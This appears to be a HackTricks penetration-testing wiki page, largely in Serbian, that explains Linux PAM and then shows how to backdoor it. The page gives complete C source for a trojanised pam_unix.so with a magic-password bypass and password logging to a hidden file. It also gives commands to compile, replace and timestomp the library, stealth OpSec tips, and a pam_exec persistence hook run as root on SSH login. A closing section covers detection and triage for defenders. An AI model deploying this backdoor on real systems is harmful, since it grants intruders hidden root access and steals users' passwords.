# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Osnovne informacije

**PAM (Pluggable Authentication Modules)** deluje kao bezbednosni mehanizam koji **proverava identitet korisnika koji pokušavaju da pristupe računarskim servisima**, kontrolišući njihov pristup na osnovu raznih kriterijuma. Slično je digitalnom čuvaju na vratima, osiguravajući da samo ovlašćeni korisnici mogu koristiti određene servise dok po potrebi ograničava njihovu upotrebu kako bi se sprečilo preopterećenje sistema.

#### Konfiguracione datoteke

- **Solaris and UNIX-based systems** obično koriste centralnu konfiguracionu datoteku lociranu na `/etc/pam.conf`.
- **Linux systems** više preferiraju pristup zasnovan na direktorijumima, smeštajući konfiguracije specifične za servis unutar `/etc/pam.d`. Na primer, konfiguraciona datoteka za login servis nalazi se na `/etc/pam.d/login`.

An example of a PAM configuration for the login service might look like this:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM oblasti upravljanja**

Ove oblasti, ili grupe za upravljanje, uključuju **auth**, **account**, **password** i **session**, od kojih je svaka odgovorna za različite aspekte procesa autentifikacije i upravljanja sesijom:

- **Auth**: Validira identitet korisnika, često tražeći lozinku.
- **Account**: Rukuje verifikacijom naloga, proveravajući uslove kao što su članstvo u grupi ili vremenska ograničenja.
- **Password**: Upravlja promenama lozinki, uključujući provere kompleksnosti i sprečavanje napada rečnikom.
- **Session**: Upravlja radnjama pri početku ili završetku sesije servisa, kao što su montiranje direktorijuma ili podešavanje ograničenja resursa.

#### **Kontrole PAM modula**

Kontrole određuju kako će modul reagovati na uspeh ili neuspeh, utičući na celokupan proces autentifikacije. One uključuju:

- **Required**: Neuspeh obaveznog modula dovodi do konačnog neuspeha, ali tek nakon što su svi naredni moduli provereni.
- **Requisite**: Neposredno prekida proces u slučaju neuspeha.
- **Sufficient**: Uspeh preskače ostatak provera iste oblasti, osim ako neki naredni modul ne zakaže.
- **Optional**: Izaziva neuspeh samo ako je jedini modul u nizu.

#### Primer scenarija

U podešavanju sa više auth modula, proces sledi strogi redosled. Ako modul `pam_securetty` utvrdi da je terminal za prijavu neautorizovan, root prijave se blokiraju, ali se svi moduli i dalje obrađuju zbog njegovog "required" statusa. `pam_env` postavlja promenljive okruženja, potencijalno poboljšavajući korisničko iskustvo. Moduli `pam_ldap` i `pam_unix` rade zajedno na autentifikaciji korisnika, pri čemu `pam_unix` pokušava da iskoristi prethodno unetu lozinku, povećavajući efikasnost i fleksibilnost metoda autentifikacije.

## Backdooring PAM – Hooking `pam_unix.so`

A classic persistence trick in high-value Linux environments is to **swap the legitimate PAM library with a trojanised drop-in**.  Because every SSH / console login ends up calling `pam_unix.so:pam_sm_authenticate()`, a few lines of C are enough to capture credentials or implement a *magic* password bypass.

### Kratki vodič za kompajliranje
<details>
<summary>Primer `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Kompajliraj i stealth-replace:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec Tips
1. **Atomic overwrite** – upišite u privremeni fajl i `mv` na mesto da izbegnete polu-napisane biblioteke koje bi zaključale SSH.
2. Pozicioniranje log fajla poput `/usr/bin/.dbus.log` stapа se sa legitimnim desktop artefaktima.
3. Obezbedite da su symbol exports identični (`pam_sm_setcred`, itd.) kako biste izbegli PAM nepoželjno ponašanje.

### Otkrivanje
* Uporedite MD5/SHA256 `pam_unix.so` sa paketom distribucije.
* `rpm -V pam` ili `debsums -s libpam-modules` da biste uočili zamenjene biblioteke bez ručnog hasiranja.
* Proverite da li su fajlovi pod `/lib/security/` world-writable ili imaju neobičnog vlasnika.
* `auditd` pravilo: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Pretražite PAM konfiguracije za neočekivane module: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Brze komande za trijažu (posle kompromitovanja ili lova na pretnje)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Zloupotreba `pam_exec` za persistence
Umesto zamene `pam_unix.so`, lakši pristup je da se doda linija `pam_exec` u `/etc/pam.d/sshd` tako da svaki SSH login pokreće implant, a pritom ostavlja normalni stack netaknut:
```bash
# Prepend to /etc/pam.d/sshd
session optional pam_exec.so quiet /usr/local/bin/.ssh_hook.sh
```
`pam_exec` se izvršava kao root unutar sshd PAM konteksta, pa skripta može da pokrene reverse shells, prikupi env vars ili ponovo otvori implanted sockets bez izmena u datotečnom sistemu osnovnih biblioteka.

## Izvori

- [https://hotpotato.tistory.com/434](https://hotpotato.tistory.com/434)
- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)

{{#include ../../banners/hacktricks-training.md}}
